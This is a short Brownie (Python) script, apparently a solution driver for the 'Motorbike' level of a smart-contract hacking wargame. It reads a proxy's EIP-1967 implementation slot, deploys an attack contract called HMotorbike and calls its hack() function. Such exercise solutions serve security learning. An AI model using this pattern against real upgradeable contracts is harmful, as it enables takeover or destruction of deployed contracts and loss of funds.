from sys import implementation
from brownie import config, accounts, HMotorbike, web3

def main():
    deploy()

def deploy():
    account = accounts.add(config['wallets']['dev_account_1']['private_key'])

    ia = web3.eth.getStorageAt('0x41C839A999fd294606F8d86b6eb35edDe0457fcD', '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc').hex()[-40:]
    implementation_address = f"0x{ia}"
    h_motorbike = HMotorbike.deploy(
        implementation_address,
        {'from': account}
    )

    h_motorbike.hack({'from': account}).wait(1)